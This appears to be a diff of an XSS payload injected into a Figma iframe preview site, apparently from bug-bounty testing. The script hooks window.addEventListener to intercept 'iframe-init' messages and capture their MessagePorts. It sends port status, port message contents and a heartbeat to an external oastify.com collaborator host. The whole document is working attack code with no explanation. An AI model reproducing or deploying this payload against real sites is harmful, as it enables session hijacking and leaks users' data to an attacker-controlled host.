@@ -1,31 +1,32 @@
 <script>
-  alert('XSS on figmaiframepreview.figma.site - payload loaded!')
-  const _origAEL = window.addEventListener.bind(window)
-  window.addEventListener = function(type, handler, ...args) {
+alert('XSS fired!')
+
+  var _origAEL = window.addEventListener.bind(window)
+  window.addEventListener = function(type, handler) {
     if (type === 'message') {
       _origAEL(type, function(e) {
-        if (e.data?.type === 'iframe-init' && e.ports?.length) {
+        if (e.data && e.data.type === 'iframe-init' && e.ports && e.ports.length) {
           window._port0 = e.ports[0]
           window._port1 = e.ports[1]
-          alert('iframe-init intercepted! port0=' + !!e.ports[0] + ' port1=' + !!e.ports[1])
+          alert('ports captured! p1=' + !!e.ports[1])
           fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/ports?p0=' + !!e.ports[0] + '&p1=' + !!e.ports[1])
-          fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/options?data=' +
-  encodeURIComponent(JSON.stringify(e.data.previewIframeInitialOptions || {})))
         }
         handler.call(this, e)
-      }, ...args)
+      })
     } else {
-      _origAEL(type, handler, ...args)
+      _origAEL(type, handler)
     }
   }
+
   window._port0 = window.messagePort
+
   if (window.messagePort) {
-    window.messagePort.onmessage = (e) => {
+    window.messagePort.onmessage = function(e) {
       fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/port0msg?d=' +
   encodeURIComponent(JSON.stringify(e.data)))
     }
-    window.messagePort.postMessage({data: {method: 'status', state: 'ready', isReady: true}})
   }
+
   fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/alive?t=' + Date.now())
   </script>
 
